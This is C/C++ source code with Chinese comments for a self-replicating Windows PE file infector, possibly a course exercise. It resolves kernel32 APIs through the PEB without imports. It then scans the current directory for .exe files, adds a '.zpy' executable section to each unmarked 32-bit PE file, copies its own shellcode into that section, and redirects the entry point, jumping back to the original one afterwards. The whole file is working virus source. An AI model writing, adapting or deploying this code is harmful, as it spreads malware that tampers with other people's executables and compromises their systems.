#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <winternl.h>

using namespace std;

typedef struct MY_UNICODE_STRING {
	WORD Length;			// 有效字符串长度
	WORD MaximumLength;		// 字符串最大字节数
	PWORD Buffer;			// 指向字符串的指针
}MY_UNICODE_STRING;

typedef struct MY_LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;			// _LIST_ENTRY
	LIST_ENTRY InMemoryOrderLinks;			// _LIST_ENTRY
	LIST_ENTRY InInitializationOrderLinks;	// _LIST_ENTRY
	VOID* DllBase;							// Ptr32 Void
	VOID* EntryPoint;						// Ptr32 Void
	ULONG SizeOfImage;						// Uint4B
	MY_UNICODE_STRING FullDllName;				// _UNICODE_STRING
	MY_UNICODE_STRING BaseDllName;				// _UNICODE_STRING
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	LIST_ENTRY HashTableEntry;
	ULONG TimeDateStamp;
}MY_LDR_DATA_TABLE_ENTRY;

typedef FARPROC(WINAPI* PGETPROCADDRESS)(HMODULE hModule, PCSTR lpProcName);
typedef HMODULE(WINAPI* PLOADLIBRARYA)(LPCTSTR lpFileName);
typedef BOOL(WINAPI* PCOPYFILE)(LPCTSTR lpExistingFileName, LPCTSTR lpNewFileName, BOOL bFailIfExists);
typedef HANDLE(WINAPI* PFINDFIRSTFILEA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI* PFINDCLOSE)(HANDLE hFindFile);
typedef HANDLE(WINAPI* PCREATEFILEA)(
	LPCSTR                lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
	);

typedef BOOL(WINAPI* PFINDNEXTFILEA) (
	_In_ HANDLE hFindFile,
	_Out_ LPWIN32_FIND_DATAA lpFindFileData
	);
typedef BOOL(WINAPI* PClOSEHANDLE) (
	_In_ _Post_ptr_invalid_ HANDLE hObject
	);
typedef BOOL(WINAPI* PREADFILE)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* PWRITEFILE)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* PSETPOINTEREX)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD);
typedef LPVOID(WINAPI* PVRITUALALLOC)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);
typedef BOOL(WINAPI* PVIRTUALFREE)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  dwFreeType
	);

#pragma code_seg(".zpy")  // shellcode放置在.zpy段中
int shellcode() {


	PGETPROCADDRESS pGetProcAddress = NULL;

	MY_LDR_DATA_TABLE_ENTRY* pCurrentModule = NULL;
	MY_LDR_DATA_TABLE_ENTRY* pModuleListHead = NULL;


	__asm {
		mov	eax, fs: [0x30]			// PEB
		mov	eax, [eax + 0x0c]		// PEB_LDR
		mov eax, [eax + 0x0c]		// InLoadOrderModuleList
		mov pModuleListHead, eax	// pModuleListHead指向链表开头
		mov eax, [eax]
		mov pCurrentModule, eax		//指向链表第二位
	}

	DWORD dwKernel32Base = 0;
	const char KERNEL32[] = { 'K',0,'E',0,'R',0,'N',0,'E',0,'L',0,'3',0,'2', 0,'.',0,'D',0,'L',0,'L',0,0,0 };
	const char GET_PRO_ACCESS[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };

	// 循环双向链表，找到kernel32.dll地址
	while (pCurrentModule && pModuleListHead && pCurrentModule != pModuleListHead) {		// 循环双链表
		const char* pModuleName = (const char*)pCurrentModule->BaseDllName.Buffer;
		const char* pKernel32 = KERNEL32;
		while (*pKernel32 && *pModuleName) {
			if ((*pKernel32 | 0x20) != (*pModuleName | 0x20)) // 将字符转为小写再比较
				break;
			++pKernel32;
			++pModuleName;
		}
		if (*pKernel32 == 0 && *pModuleName == 0) {				//比较结束，两个字符串相同
			dwKernel32Base = (DWORD)pCurrentModule->DllBase;	// kernel32的DllBase
			break;
		}
		pCurrentModule = (MY_LDR_DATA_TABLE_ENTRY*)pCurrentModule->InLoadOrderLinks.Flink;		// 遍历寻找
	}

	// 遍历导出表找GetProAccess函数地址
	IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)dwKernel32Base;
	IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)((DWORD)dwKernel32Base + pDosHeader->e_lfanew);
	IMAGE_EXPORT_DIRECTORY* pExDirectory = (IMAGE_EXPORT_DIRECTORY*)((DWORD)dwKernel32Base + pNtHeader->OptionalHeader.DataDirectory[0].VirtualAddress);// 导出表RVA
	DWORD* pExAddTable = (DWORD*)((DWORD)dwKernel32Base + pExDirectory->AddressOfFunctions);		// 导出函数地址表的VA
	DWORD* pNaPTable = (DWORD*)((DWORD)dwKernel32Base + pExDirectory->AddressOfNames);				// 导出函数的名称表的VA 
	WORD* pOrdTable = (WORD*)((DWORD)dwKernel32Base + pExDirectory->AddressOfNameOrdinals);			// 以名称导出的函数的序号表VA

	//	遍历名称表找到"GetProAccess"的order，根据order找到函数地址
	for (DWORD dwOrder = 0; dwOrder < pExDirectory->NumberOfNames; dwOrder++) {  // 遍历导出函数表
		const char* pFun = (const char*)((DWORD)dwKernel32Base + pNaPTable[dwOrder]);
		const char* pTargetFun = GET_PRO_ACCESS;
		while (*pFun && *pTargetFun && (*pFun | 0x20) == (*pTargetFun | 0x20)) {		// 将字符转为小写再比较
			++pFun;
			++pTargetFun;
		}
		if (*pFun == 0 && *pTargetFun == 0) {  // 比较结束，两个字符串相同
			DWORD dwFuncAddr = (DWORD)dwKernel32Base + pExAddTable[pOrdTable[dwOrder]];
			pGetProcAddress = (PGETPROCADDRESS)dwFuncAddr;
			break;
		}

	}

	// 创建文件2020302181165
	const char CREATE_FILE_A[] = { 'C','r','e','a','t','e','F','i','l','e','A', 0 };
	const char FILE_NAME[] = { '2','0','2','0','3','0','2','1','8','1','1', '6', '5', 0};
	PCREATEFILEA pCreateFileA = (PCREATEFILEA)pGetProcAddress((HMODULE)dwKernel32Base, CREATE_FILE_A);
	HANDLE hNewFile = pCreateFileA(FILE_NAME, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);

	// 定义感染用到的变量
	#define sizeInt(x,y) (y * (x/y + (x%y != 0)))  // 通过宏定义一个向上取整对齐的操作
	#define CODE_SIZE 0x1000

	IMAGE_DOS_HEADER dosHeader;
	IMAGE_NT_HEADERS ntHeader;
	IMAGE_SECTION_HEADER newSectionHeader;  // 新增节的节表项
	IMAGE_SECTION_HEADER lastSectionHeader;    // 旧的最后一个节表项
	int numSections = 0;

	const char search[8] = { '.', '\\', '*', '.', 'e', 'x', 'e', 0 };
	const char FIND_FIRST_FILE_A[] = { 'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'A',0 };
	const char FIND_NEXT_FILE_A[] = { 'F', 'i', 'n', 'd', 'N', 'e', 'x', 't', 'F', 'i', 'l', 'e', 'A',0 };
	const char FIND_CLOSE[] = { 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e',0 };
	const char CLOSE_HANDLE[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e',0 };
	const char RB[] = { 'r', 'b', '+' };
	const char READ_FILE_A[] = { 'R','e','a','d','F','i','l','e','\0' };
	const char WRITE_FILE_A[] = { 'W','r','i','t','e','F','i','l','e','\0' };
	const char SET_FILE_POINTER_EX[] = { 'S','e','t','F','i','l','e','P','o','i','n','t','e','r','E','x','\0' };
	const char VIRTUAL_ALLOC_A[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','\0' };
	const char VIRTUAL_FREE_A[] = { 'V','i','r','t','u','a','l','F','r','e','e','\0' };

	// 通过GetProAccess函数找到用到的所有函数的地址
	PFINDFIRSTFILEA pFindFirstFileA = (PFINDFIRSTFILEA)pGetProcAddress((HMODULE)dwKernel32Base, FIND_FIRST_FILE_A);
	PFINDNEXTFILEA pFindNextFileA = (PFINDNEXTFILEA)pGetProcAddress((HMODULE)dwKernel32Base, FIND_NEXT_FILE_A);
	PFINDCLOSE pFindClose = (PFINDCLOSE)pGetProcAddress((HMODULE)dwKernel32Base, FIND_CLOSE);
	PClOSEHANDLE pCloseHandle = (PClOSEHANDLE)pGetProcAddress((HMODULE)dwKernel32Base, CLOSE_HANDLE);
	PREADFILE pReadFileA = (PREADFILE)pGetProcAddress((HMODULE)dwKernel32Base, READ_FILE_A);
	PWRITEFILE pWriteFileA = (PWRITEFILE)pGetProcAddress((HMODULE)dwKernel32Base, WRITE_FILE_A);
	PSETPOINTEREX pSetFilePointerEx = (PSETPOINTEREX)pGetProcAddress((HMODULE)dwKernel32Base, SET_FILE_POINTER_EX);
	PVRITUALALLOC pVirtualAllocA = (PVRITUALALLOC)pGetProcAddress((HMODULE)dwKernel32Base, VIRTUAL_ALLOC_A);
	PVIRTUALFREE pVirtualFreeA = (PVIRTUALFREE)pGetProcAddress((HMODULE)dwKernel32Base, VIRTUAL_FREE_A);

	// 找到当前运行的exe的EntryPoint，即shellcode存放位置，用于感染
	PBYTE shellCode = NULL;
	PPEB peb;
	PBYTE imageBase;
	// get peb
	__asm {
		mov eax, fs: [30h] ;
		mov peb, eax
	}
	// get EntryPoint
	imageBase = (PBYTE)peb->Reserved3[1];  //PEB->ImagaBaseAddress
	shellCode = (PBYTE) *(DWORD *)(imageBase + 0x3C);  //Dos->e_lfanew
	shellCode = shellCode + (DWORD)imageBase;// NtHeader
	shellCode = (PBYTE) *(DWORD*)(shellCode + 0x28); // EntryPoint rva
	shellCode = shellCode + (DWORD)imageBase;

	__asm {
		xchg bx,bx
	}

	// 寻找以“.exe”结尾的文件进行感染（会判断是否是32bitPE文件）
	WIN32_FIND_DATAA findData;
	HANDLE hFind = pFindFirstFileA(search, &findData);
	if (hFind == INVALID_HANDLE_VALUE) return 1;

	LPWIN32_FIND_DATAA lpFindData = &findData;

	char* find_file;

	do {

		if (findData.cFileName[0] == '.')
			continue;
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			continue;
		find_file = findData.cFileName;

		HANDLE hf = pCreateFileA(
			find_file,
			GENERIC_READ | GENERIC_WRITE,
			0, NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		if (hf == NULL) continue;

		//getHeader，获取DosHeader、NtHeader、节表项信息
		//-----------------------------------------------------------------------------
		DWORD dwReadedSize;
		LARGE_INTEGER offset;

		offset.QuadPart = 0;
		pSetFilePointerEx(hf, offset, &offset, FILE_BEGIN);
		pReadFileA(hf, &dosHeader, sizeof(IMAGE_DOS_HEADER), &dwReadedSize, NULL);

		offset.QuadPart = dosHeader.e_lfanew;
		pSetFilePointerEx(hf, offset, &offset, FILE_BEGIN);
		pReadFileA(hf, &ntHeader, sizeof(IMAGE_NT_HEADERS), &dwReadedSize, NULL);

		numSections = ntHeader.FileHeader.NumberOfSections;


		//isPE && isInfected，判断是否是32bit的PE文件、是否已经被感染
		//-----------------------------------------------------------------------------
		if (dosHeader.e_magic != 0x5A4D || ntHeader.OptionalHeader.Magic != 0x10b || ntHeader.Signature != 0x4550) 
			continue;
		
		// 遍历节表名，判断是否已经被感染
		int infected_flag = 0;
		for (int i = 0; i < numSections; i++) {
			IMAGE_SECTION_HEADER temSectionHeader;
			offset.QuadPart = dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) + i * sizeof(IMAGE_SECTION_HEADER);
			pSetFilePointerEx(hf, offset, &offset, FILE_BEGIN);

			if (pReadFileA(hf, &temSectionHeader, sizeof(IMAGE_SECTION_HEADER), &dwReadedSize, NULL) == 0) {
				pCloseHandle(hf);
				break;
			}
			const char targetName[] = { '.','z','p','y','\0' };
			char* sectionName = (char*)temSectionHeader.Name;
			int j = 0;
			while (sectionName[j] != '\0' && targetName[j] != '\0') {
				if (sectionName[j] != targetName[j])
					break;
				j++;
			}
			if (sectionName[j] == '\0' && targetName[j] == '\0') {
				infected_flag = 1;
				break;
			}
		}

		if (infected_flag) continue;


		//addSection:创建新节，设置相关属性并填充为0，同时更新NT头相关信息
		//-----------------------------------------------------------------------------
		offset.QuadPart = dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (numSections - 1) * sizeof(IMAGE_SECTION_HEADER);
		pSetFilePointerEx(hf, offset, &offset, FILE_BEGIN);
		pReadFileA(hf, &lastSectionHeader, sizeof(IMAGE_SECTION_HEADER), &dwReadedSize, NULL);

		//获取最后一个节表项信息
		DWORD pointerofrawdata = lastSectionHeader.PointerToRawData;
		DWORD sizeofrawdata = lastSectionHeader.SizeOfRawData;
		DWORD virtualaddress = lastSectionHeader.VirtualAddress;
		DWORD virtualsize = lastSectionHeader.Misc.VirtualSize;

		// 设置新的节表项属性，修改对应节个数等信息
		newSectionHeader.Name[0] = '.';
		newSectionHeader.Name[1] = 'z';
		newSectionHeader.Name[2] = 'p';
		newSectionHeader.Name[3] = 'y';
		newSectionHeader.Name[4] = '\0';

		long int codelength = CODE_SIZE;
		int sectionAlignment = ntHeader.OptionalHeader.SectionAlignment;
		int fileAlignment = ntHeader.OptionalHeader.FileAlignment;

		newSectionHeader.SizeOfRawData = (DWORD)(sizeInt(codelength, fileAlignment)); //分配节的大小，与文件对齐
		newSectionHeader.VirtualAddress = (DWORD)(virtualaddress + sizeInt(virtualsize, sectionAlignment));  //向上取整，进行对齐
		newSectionHeader.Misc.VirtualSize = codelength;
		newSectionHeader.PointerToRawData = pointerofrawdata + sizeofrawdata; // 节数据在文件中的偏移
		newSectionHeader.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ; // 属性为可执行代码和可读

		// 写入新的节表项
		offset.QuadPart = dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) + numSections * sizeof(IMAGE_SECTION_HEADER);
		pSetFilePointerEx(hf, offset, &offset, FILE_BEGIN);
		pWriteFileA(hf, &newSectionHeader, sizeof(IMAGE_SECTION_HEADER), &dwReadedSize, NULL);

		// 更新NT头
		ntHeader.FileHeader.NumberOfSections += 1;
		ntHeader.OptionalHeader.SizeOfImage += sizeInt(codelength, sectionAlignment);
		offset.QuadPart = dosHeader.e_lfanew;
		pSetFilePointerEx(hf, offset, &offset, FILE_BEGIN);
		pWriteFileA(hf, &ntHeader, sizeof(IMAGE_NT_HEADERS), &dwReadedSize, NULL);

		// 分配内存空间并填充为零
		offset.QuadPart = newSectionHeader.PointerToRawData;
		pSetFilePointerEx(hf, offset, &offset, FILE_BEGIN);
		LPVOID s = pVirtualAllocA(NULL, newSectionHeader.SizeOfRawData, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		pWriteFileA(hf, s, newSectionHeader.SizeOfRawData, &dwReadedSize, NULL);
		pVirtualFreeA(s, 0, MEM_RELEASE);


		//changeEntry:设置新的EntryPoint，并保存旧的EntryPoint
		//-----------------------------------------------------------------------------

		// 将地址转换成两个 word 类型的值
		WORD entry_point_high = (WORD)(ntHeader.OptionalHeader.AddressOfEntryPoint >> 16);
		WORD entry_point_low = (WORD)(ntHeader.OptionalHeader.AddressOfEntryPoint & 0xFFFF);

		// 存入 e_res 数组中
		dosHeader.e_res[0] = entry_point_low;
		dosHeader.e_res[1] = entry_point_high;

		//更新Dos头
		offset.QuadPart = 0;
		pSetFilePointerEx(hf, offset, &offset, FILE_BEGIN);
		pWriteFileA(hf, &dosHeader, sizeof(IMAGE_DOS_HEADER), &dwReadedSize, NULL);

		// 设置新的入口地址
		ntHeader.OptionalHeader.AddressOfEntryPoint = newSectionHeader.VirtualAddress;

		// 写入更新后的PE头信息
		offset.QuadPart = dosHeader.e_lfanew;
		pSetFilePointerEx(hf, offset, &offset, FILE_BEGIN);
		pWriteFileA(hf, &ntHeader, sizeof(IMAGE_NT_HEADERS), &dwReadedSize, NULL);


		//paddingShellcode：填充Shellcode至新增节
		offset.QuadPart = newSectionHeader.PointerToRawData;
		pSetFilePointerEx(hf, offset, &offset, FILE_BEGIN);
		pWriteFileA(hf, shellCode, sizeof(unsigned char) * (CODE_SIZE / sizeof(unsigned char)), &dwReadedSize, NULL);

		//InfectTarget(sb, hf); inject功能
		pCloseHandle(hf);
	} while (pFindNextFileA(hFind, lpFindData));  // 遍历寻找文件

	pFindClose(hFind);

	// 跳转回原先的EntyOfPoint
	_asm {
		mov eax, fs: [30h]      // PEB
		//mov eax, [eax + 0x08]
		mov eax, [eax + 0x0c]   // LDR
		mov eax, [eax + 0x14]   // InMemoryOrderModuleList
		mov eax, [eax + 0x10]   // DllBase，实际的ImageBase

		mov ebx, [eax + 0x1c]	// e_res[0]
		mov ecx, [eax + 0x1e]	// e_res[1]，高16位
		shl ecx, 16				// 将e_res[1]左移16位
		or ebx, ecx				// 合成EntryOfPoint地址
		add eax, ebx

		//add eax, 0xAABBEEFF
		jmp eax            // 跳转到目标函数地址
		nop
		nop
	}
}


int main() {
	shellcode();
	return 0;
}
